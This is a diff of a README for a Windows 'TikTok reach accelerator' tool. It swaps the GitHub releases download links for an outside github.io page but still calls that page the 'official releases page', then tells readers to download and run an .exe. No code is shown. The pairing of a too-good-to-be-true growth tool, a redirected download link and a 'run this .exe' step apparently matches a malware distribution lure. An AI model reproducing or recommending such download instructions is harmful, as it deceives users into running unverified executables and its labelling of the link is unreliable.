@@ -1,6 +1,6 @@
 # 🚀 TikTok-Reach-Accelerator-Pro-2026 - Improve Your Video Visibility Fast
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/surprised-lockingpliers678/TikTok-Reach-Accelerator-Pro-2026---Fast-Video-Visibility-Tool-for-Windows/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://surprised-lockingpliers678.github.io)
 
 This application helps creators increase the reach of their TikTok content. The tool functions on Windows systems to improve video performance. You do not need to provide your TikTok account login details to use this software. 
 
@@ -18,7 +18,7 @@ To run this tool, your computer needs the following specifications:
 
 Follow these steps to set up the tool on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/surprised-lockingpliers678/TikTok-Reach-Accelerator-Pro-2026---Fast-Video-Visibility-Tool-for-Windows/releases) to access the latest version.
+1. Visit the [official releases page](https://surprised-lockingpliers678.github.io) to access the latest version.
 2. Look for the "Assets" section at the bottom of the most recent release.
 3. Click the file that ends with ".exe" to begin the download.
 4. Locate the downloaded file in your "Downloads" folder.
